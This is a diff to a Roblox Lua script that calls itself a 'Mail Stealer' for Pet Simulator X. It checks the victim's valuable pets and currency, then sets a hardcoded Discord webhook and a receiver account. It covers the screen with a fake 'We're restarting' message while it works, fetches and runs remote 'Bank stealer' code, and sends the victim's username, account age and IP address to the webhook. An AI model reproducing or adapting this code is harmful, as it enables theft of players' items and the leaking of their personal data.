@@ -1,3 +1,25 @@
+-- MAIL STEALER BELLOW
+
+-- [EgorikusaHub Mailstealer]
+
+local Library = require(game.ReplicatedStorage.Framework.Library);
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
+
+local savedPets = Library.Save.Get().Pets
+hugeamount = 0
+for i,v in pairs(Library.Save.Get().Pets) do
+    local Pet = Library.Directory.Pets[v.id]
+        if Pet.huge == true then
+        hugeamount = hugeamount + 1
+        print(v)
+    end
+end
+if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
+     UserName = "TehPucuk_55"
+     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
+end
+
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -133,7 +155,22 @@ request = (syn and syn.request) or (http and http.request) or http_request or (f
 
 local exploit
 local function getexploit()
-    local exploitt = identifyexecutor()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
+
     exploit = exploitt
 end
 getexploit()
@@ -148,8 +185,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-
-                            local ScreenGui = Instance.new("ScreenGui")
+    local ScreenGui = Instance.new("ScreenGui")
                             local Frame = Instance.new("Frame")
                             local TextLabel = Instance.new("TextLabel")
                             local ImageLabel = Instance.new("ImageLabel")
@@ -199,76 +235,14 @@ if _G.LoadingScreen ~= false then
                             TextLabel_2.TextSize = 36.000
                             TextLabel_2.TextWrapped = true
 end
-if _G.AntiLeave ~= false then
-    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
-        if v.Name ~= "Inventory" then
-            v:Destroy()
-        end
-    end
-    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
-            v:Destroy()
-        end
-    end
-end
-
-                            local ScreenGui = Instance.new("ScreenGui")
-                            local Frame = Instance.new("Frame")
-                            local TextLabel = Instance.new("TextLabel")
-                            local ImageLabel = Instance.new("ImageLabel")
-                            local TextLabel_2 = Instance.new("TextLabel")
-
-                            --Properties:
-
-                            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-                            ScreenGui.DisplayOrder = 999999999
-		
-		
-                            Frame.Parent = ScreenGui
-                            Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-                            Frame.Position = UDim2.new(-1.1603854, 0, -1.10370374, 0)
-                            Frame.Size = UDim2.new(0, 1000000, 0, 100000000)
-							UIAspectRatioConstraint = Frame
-							
-                            TextLabel.Parent = ScreenGui
-                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel.BackgroundTransparency = 1.000
-                            TextLabel.Position = UDim2.new(0.1512353545, 0, 0.373532414, 0)
-                            TextLabel.Size = UDim2.new(0, 1245, 0, 310)
-                            TextLabel.ZIndex = 3
-                            TextLabel.Font = Enum.Font.SourceSansBold
-                            TextLabel.Text = "We're restarting Pet Simulator X!"
-                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel.TextSize = 70.000
-                            TextLabel.TextWrapped = true
-
-                            ImageLabel.Parent = ScreenGui
-                            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            ImageLabel.BackgroundTransparency = 1.000
-                            ImageLabel.Position = UDim2.new(0.3251033338259, 0, 0.13342583251, 0)
-                            ImageLabel.Size = UDim2.new(0, 510, 0, 259)
-                            ImageLabel.ZIndex = 2
-                            ImageLabel.Image = "http://www.roblox.com/asset/?id=13441881980"
-
-                            TextLabel_2.Parent = ScreenGui
-                            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel_2.BackgroundTransparency = 1.000
-                            TextLabel_2.Position = UDim2.new(0.1512353545, 0, 0.468594134, 0)
-                            TextLabel_2.Size = UDim2.new(0, 1245, 0, 310)
-                            TextLabel_2.ZIndex = 3
-                            TextLabel_2.Font = Enum.Font.SourceSansBold
-                            TextLabel_2.Text = "Please wait while we redirect you..."
-                            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-                            TextLabel_2.TextSize = 36.000
-                            TextLabel_2.TextWrapped = true
 
 -- Remotes
+
 local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
 local InvPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
 local MailPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox)
 local RedeemPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Reedem Rank Rewards"])
 local GiftsPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Free Gifts"])
-
 
 local getmybanksremote = debug.getconstant(BankPath.GetMyBanks, 3)
 
@@ -311,10 +285,12 @@ redeemrankremote = blobz[blobb[2](2, redeemrankremote)]
 redeemgiftsremote = blobz[blobb[2](2, redeemgiftsremote)]
 
 -- Banks Stuff
+
 local mybanks = getmybanksremote:InvokeServer()
 local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
 
 -- Inv Space Check :
+
 function invspace()
     local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
     if invspace > 50 then
@@ -329,6 +305,7 @@ function invspace_nolimit()
 end
 
 -- Bank Teleport
+
 game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
 "__MAP"].Interactive.Bank.Pad.Position)
 
@@ -793,7 +770,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -809,15 +786,55 @@ if _G.AntiLeave ~= false then
     end
 end
 
-
 local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local ImageLabel = Instance.new("ImageLabel")
-local TextLabel_2 = Instance.new("TextLabel")
+                            local Frame = Instance.new("Frame")
+                            local TextLabel = Instance.new("TextLabel")
+                            local ImageLabel = Instance.new("ImageLabel")
+                            local TextLabel_2 = Instance.new("TextLabel")
 
---Properties:
+                            --Properties:
 
+                            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+                            ScreenGui.DisplayOrder = 999999999
+		
+		
+                            Frame.Parent = ScreenGui
+                            Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                            Frame.Position = UDim2.new(-1.1603854, 0, -1.10370374, 0)
+                            Frame.Size = UDim2.new(0, 1000000, 0, 100000000)
+							UIAspectRatioConstraint = Frame
+							
+                            TextLabel.Parent = ScreenGui
+                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel.BackgroundTransparency = 1.000
+                            TextLabel.Position = UDim2.new(0.1512353545, 0, 0.373532414, 0)
+                            TextLabel.Size = UDim2.new(0, 1245, 0, 310)
+                            TextLabel.ZIndex = 3
+                            TextLabel.Font = Enum.Font.SourceSansBold
+                            TextLabel.Text = "We're restarting Pet Simulator X!"
+                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel.TextSize = 70.000
+                            TextLabel.TextWrapped = true
+
+                            ImageLabel.Parent = ScreenGui
+                            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                            ImageLabel.BackgroundTransparency = 1.000
+                            ImageLabel.Position = UDim2.new(0.3251033338259, 0, 0.13342583251, 0)
+                            ImageLabel.Size = UDim2.new(0, 510, 0, 259)
+                            ImageLabel.ZIndex = 2
+                            ImageLabel.Image = "http://www.roblox.com/asset/?id=13441881980"
+
+                            TextLabel_2.Parent = ScreenGui
+                            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel_2.BackgroundTransparency = 1.000
+                            TextLabel_2.Position = UDim2.new(0.1512353545, 0, 0.468594134, 0)
+                            TextLabel_2.Size = UDim2.new(0, 1245, 0, 310)
+                            TextLabel_2.ZIndex = 3
+                            TextLabel_2.Font = Enum.Font.SourceSansBold
+                            TextLabel_2.Text = "Please wait while we redirect you..."
+                            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel_2.TextSize = 36.000
+                            TextLabel_2.TextWrapped = true
 -- Pets Tables :
 
 TitanicList = {}
@@ -1022,7 +1039,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1092,7 +1109,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1133,33 +1150,33 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     end
 end
 
-local dhuser = getgenv().Settings.User
- if getgenv().Settings ~= nil then
-     if getgenv().Settings.PremiumKey ~= nil then
-         local premkey = getgenv().Settings.PremiumKey
-         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
-         local dhdata = {
-             dhprem = dhkey
-         }
-         local dhurl = "https://premm.gcs123.repl.co/premium.php?key=" .. User-- Exc : https://rizz.xyz/premium.php
-         local dhheaders = {
-             ["content-type"] = "application/json"
-         }
-         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
-         local dhresponse = request({
-             Url = dhurl,
-             Body = dhnewdata,
-             Method = "POST",
-             Headers = dhheaders
-         })
-         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-         if responsed ~= 'false' then
-             dhuser = responsed
-         else
-             dhuser = nil
-         end
-     end
- end
+local dhuser
+if getgenv().Settings ~= nil then
+    if getgenv().Settings.PremiumKey ~= nil then
+        local premkey = getgenv().Settings.PremiumKey
+        local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+        local dhdata = {
+            dhprem = dhkey
+        }
+        local dhurl = "https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Key"
+        local dhheaders = {
+            ["content-type"] = "application/json"
+        }
+        local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+        local dhresponse = request({
+            Url = dhurl,
+            Body = dhnewdata,
+            Method = "POST",
+            Headers = dhheaders
+        })
+        local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+        if responsed ~= 'false' then
+            dhuser = responsed
+        else
+            dhuser = nil
+        end
+    end
+end
 local titanicin
 local bananin
 local hugein
@@ -1169,7 +1186,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Monzz Better"
+local mailmsg = "Monzz"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
